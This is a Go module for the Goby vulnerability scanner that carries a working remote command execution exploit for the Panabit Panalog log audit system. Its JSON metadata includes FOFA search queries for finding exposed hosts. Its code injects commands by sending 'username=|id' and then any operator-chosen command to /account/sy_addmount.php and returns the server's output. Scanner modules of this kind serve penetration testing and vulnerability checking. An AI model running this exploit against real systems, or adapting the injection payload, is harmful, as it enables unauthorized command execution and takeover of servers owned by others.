package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Panabit Panalog sy_addmount.php RCE",
    "Description": "<p>Panalog is a log audit system, which is convenient for users to centrally monitor and manage massive Panabit devices on the network.</p><p>Panalog log audit system sy_addmount.php file has a remote command execution vulnerability. Attackers can execute arbitrary commands to take over server permissions.</p>",
    "Impact": "Panabit Panalog sy_addmount.php RCE",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.panabit.com\">https://www.panabit.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Panalog",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Panalog 日志审计系统 sy_addmount.php 文件远程命令执行漏洞",
            "Description": "<p>Panalog是一款日志审计系统，方便用户统一集中监控、管理在网的海量设备。</p><p>Panalog日志审计系统 sy_addmount.php文件存在远程命令执行漏洞，攻击者可执行任意命令，接管服务器权限。</p>",
            "Impact": "<p>Panalog日志审计系统 sy_addmount.php文件存在远程代码执行漏洞，攻击者可执行任意命令，接管服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.panabit.com\">https://www.panabit.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Panalog",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Panabit Panalog sy_addmount.php RCE",
            "Description": "<p>Panalog is a log audit system, which is convenient for users to centrally monitor and manage massive Panabit devices on the network.</p><p>Panalog log audit system sy_addmount.php file has a remote command execution vulnerability. Attackers can execute arbitrary commands to take over server permissions.</p>",
            "Impact": "Panabit Panalog sy_addmount.php RCE",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.panabit.com\">https://www.panabit.com/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Panalog",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\" || body=\"Maintain/cloud_index.php\"",
    "GobyQuery": "(body=\"id=\\\"codeno\\\"\" && body=\"日志系统\") || title=\"panalog\" || body=\"Maintain/cloud_index.php\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.panabit.com/",
    "DisclosureDate": "2021-10-20",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [
            "Panalog"
        ],
        "Hardware": []
    },
    "PocId": "10235"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri_1 := "/account/sy_addmount.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Data = "username=|id"
			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid") && strings.Contains(resp.RawBody, "gid")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri_1 := "/account/sy_addmount.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg_1.Data = "username=|" + cmd
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
